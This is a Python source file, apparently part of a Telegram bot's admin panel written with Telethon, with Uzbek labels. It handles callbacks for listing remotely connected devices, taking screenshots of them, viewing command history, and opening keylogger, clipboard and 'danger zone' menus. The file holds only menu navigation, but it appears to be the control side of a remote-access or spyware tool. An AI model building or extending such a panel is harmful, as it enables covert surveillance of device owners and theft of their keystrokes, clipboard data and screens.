# handlers/callback_handlers.py - v3.0.5 Callback Handlers
"""
Telegram callback query handlers:
- Panel navigation
- Device actions
- Settings
"""

import logging
from telethon import events

logger = logging.getLogger(__name__)


def register_callback_handlers(client, services):
    """
    Callback handlerlarni ro'yxatdan o'tkazish
    
    Args:
        client: TelegramClient
        services: Dict - {'db', 'device_service', 'ai_service', 'admin_id'}
    """
    admin_id = services.get('admin_id')
    device_service = services.get('device_service')
    ai_service = services.get('ai_service')
    
    def is_admin(event):
        return event.sender_id == admin_id
    
    @client.on(events.CallbackQuery())
    async def callback_handler(event):
        """Main callback handler"""
        if not is_admin(event):
            return
        
        data = event.data.decode()
        
        try:
            # ==================== NAVIGATION ====================
            if data == "back_to_main":
                from panels import admin_panel
                await event.edit("🖥 **Asosiy Menyu v3.0.5**", buttons=admin_panel)
            
            elif data == "universal_panel":
                from panels import universal_panel
                await event.edit("🌐 **Universal Boshqaruv**", buttons=universal_panel)
            
            elif data == "device_panel":
                from panels import device_panel
                await event.edit("⚡ **Qurilma Boshqaruvi**", buttons=device_panel)
            
            elif data == "advanced_panel":
                from panels import advanced_panel
                await event.edit("🔧 **Qo'shimcha**", buttons=advanced_panel)
            
            elif data == "device_list":
                from panels import create_device_list_panel
                if device_service:
                    devices = device_service.get_all_devices()
                    await event.edit("💻 **Qurilmalar**", buttons=create_device_list_panel(devices))
                else:
                    await event.edit("💻 **Qurilmalar**", buttons=create_device_list_panel({}))
            
            elif data == "stats":
                from panels import create_stats_panel
                await event.edit("📊 **Statistika**", buttons=create_stats_panel())
            
            elif data == "settings":
                from panels import settings_panel
                await event.edit("⚙️ **Sozlamalar**", buttons=settings_panel)
            
            # ==================== AI ====================
            elif data == "ai_settings":
                from panels import ai_settings_panel
                if ai_service:
                    status = "✅ Yoqilgan" if ai_service.is_enabled else "❌ O'chirilgan"
                else:
                    status = "❌ Mavjud emas"
                await event.edit(f"🤖 **AI Sozlamalari**\nHolat: {status}", buttons=ai_settings_panel)
            
            elif data == "ai_enable":
                if ai_service:
                    ai_service.enable()
                    await event.answer("✅ AI yoqildi")
                    from panels import ai_settings_panel
                    await event.edit("🤖 **AI Sozlamalari**\nHolat: ✅ Yoqilgan", buttons=ai_settings_panel)
            
            elif data == "ai_disable":
                if ai_service:
                    ai_service.disable()
                    await event.answer("❌ AI o'chirildi")
                    from panels import ai_settings_panel
                    await event.edit("🤖 **AI Sozlamalari**\nHolat: ❌ O'chirilgan", buttons=ai_settings_panel)
            
            # ==================== DEVICE ACTIONS ====================
            elif data.startswith("device_"):
                device_id = data.replace("device_", "")
                if device_service:
                    device = device_service.get_device(device_id)
                    if device:
                        from device_manager import format_device_info
                        from telethon.tl.custom import Button
                        
                        message = format_device_info(device)
                        buttons = [
                            [Button.inline("📸 Screenshot", f"cmd_screenshot_{device_id}".encode())],
                            [Button.inline("🔙 Ortga", b"device_list")]
                        ]
                        await event.edit(message, buttons=buttons)
                    else:
                        await event.answer("❌ Device topilmadi")
            
            # ==================== STATS DETAILS ====================
            elif data == "stats_devices":
                db = services.get('db')
                if db:
                    stats = db.get_dashboard_stats()
                    text = f"💻 **Qurilmalar:**\n• Jami: {stats.get('total_devices', 0)}\n• Online: {stats.get('online_devices', 0)}"
                    await event.respond(text)
            
            elif data == "stats_commands":
                db = services.get('db')
                if db:
                    commands = db.get_command_history(limit=10)
                    text = "⚡ **So'nggi Buyruqlar:**\n\n"
                    if commands:
                        for i, cmd in enumerate(commands, 1):
                            text += f"{i}. `{cmd.get('command', 'N/A')[:25]}`\n"
                    else:
                        text += "📭 Buyruqlar yo'q"
                    await event.respond(text)
            
            # ==================== KEYLOGGER ====================
            elif data == "keylogger_menu":
                from panels import keylogger_panel
                await event.edit("⌨️ **Keylogger**", buttons=keylogger_panel)
            
            elif data == "clipboard_menu":
                from panels import clipboard_panel
                await event.edit("📋 **Clipboard**", buttons=clipboard_panel)
            
            # ==================== DANGER ZONE ====================
            elif data == "danger_zone":
                from panels import danger_zone_panel
                await event.edit("☢️ **XAVFLI ZONA**\n\n⚠️ Bu yerda juda xavfli funksiyalar!", buttons=danger_zone_panel)
            
            # ==================== BACK NAVIGATION ====================
            elif data == "back_to_advanced":
                from panels import advanced_panel
                await event.edit("🔧 **Qo'shimcha**", buttons=advanced_panel)
            
            # ==================== UNHANDLED ====================
            else:
                # Pass to original handlers.py if exists
                logger.debug(f"Unhandled callback: {data}")
                
        except Exception as e:
            error_msg = str(e).lower()
            if "not modified" not in error_msg:
                logger.error(f"Callback error: {e}")
                try:
                    await event.respond(f"❌ Xato: {str(e)}")
                except:
                    pass
    
    logger.info("Callback handlers registered")
